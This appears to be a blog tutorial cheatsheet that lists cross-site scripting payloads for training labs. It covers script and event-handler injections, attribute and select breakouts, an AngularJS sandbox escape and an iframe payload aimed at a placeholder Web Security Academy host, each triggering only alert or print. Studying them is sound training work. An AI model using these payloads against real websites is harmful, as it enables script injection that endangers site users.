---
title: "CHEATSHEET FOR XSS"
date: 2026-05-14
category: "Tutorial"
series: "BONUS"
seriesOrder: 10
tags: []
draft: false
---

```javascript
<script>alert(1)</script>
```

```javascript
><script>alert(1)</script>
```

```javascript
"><svg onload=alert(1)>
```

```javascript
<img src=1 onerror=alert(1)>
```

```javascript
javascript:alert(1)
```

```javascript
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

```javascript
></select><img src=1 onerror=alert(1)
```

```javascript
product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```

```javascript
{{$on.constructor('alert(1)')()}}
```

```javascript
\"-alert(1)}//
```

```javascript
<><img src=1 onerror=alert(1)>
```